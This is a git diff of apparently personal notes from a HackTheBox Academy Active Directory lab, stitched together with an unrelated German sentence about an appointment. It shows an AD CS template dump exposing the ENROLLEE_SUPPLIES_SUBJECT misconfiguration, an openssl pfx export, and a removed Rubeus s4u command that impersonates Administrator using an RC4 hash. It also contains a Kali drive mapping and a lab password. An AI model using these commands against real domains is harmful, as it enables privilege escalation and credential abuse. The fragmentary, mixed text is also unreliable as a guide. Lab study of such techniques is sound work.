@@ -38,7 +38,18 @@ FCDC65703DD2B0BD789977F1F3EEAECF
 Ich habe einen Termin für den 4.12.2024, aber da ich schon alle Unterlagen habe, versuche ich einen früheren zu bekommen. Falls ich einen früheren Termin bekommen, werde ich den für Dezember stornieren.
 ```
 
+CA Name                               : PKI.eagle.local\eagle-PKI-CA
+    Template Name                         : UserCert
+    Schema Version                        : 4
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication
+ request 
 
-   
+ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 
-.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /mdsspn:"http/dc1" /dc:dc1.eagle.local
+  /drive:linux,/home/kaliwork/workspace/hacklab/academy/Attackwindows
+HTB_@cademy_stdnt!
